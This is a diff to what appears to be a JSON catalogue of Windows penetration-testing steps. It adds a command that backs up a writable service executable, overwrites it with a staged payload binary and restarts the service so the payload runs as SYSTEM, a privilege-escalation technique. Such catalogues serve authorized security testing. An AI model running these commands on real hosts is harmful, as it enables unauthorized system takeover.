@@ -246,7 +246,8 @@
       "tool": "accesschk",
       "tools": [
         "accesschk",
-        "sc"
+        "sc",
+        "cmd"
       ],
       "os": [
         "windows"
@@ -289,6 +290,12 @@
           "tool": "sh",
           "run": "icacls \"C:\\path\\to\\service.exe\"",
           "note": "Alternatively, if the executable itself is writable, keep a backup and overwrite it with your payload."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "run": "copy /Y \"{{service_binary|C:\\path\\to\\service.exe}}\" \"{{service_binary|C:\\path\\to\\service.exe}}.bak\" && copy /Y C:\\Windows\\Temp\\payload.exe \"{{service_binary|C:\\path\\to\\service.exe}}\" && net stop {{service}} && net start {{service}}",
+          "note": "Back up the writable service executable, replace it with your staged payload binary, and restart the service (or reboot if start/stop rights are restricted) so SCM launches it as SYSTEM."
         }
       ]
     },
@@ -1129,7 +1136,8 @@
       "tool": "accesschk",
       "tools": [
         "accesschk",
-        "sc"
+        "sc",
+        "cmd"
       ],
       "os": [
         "windows"
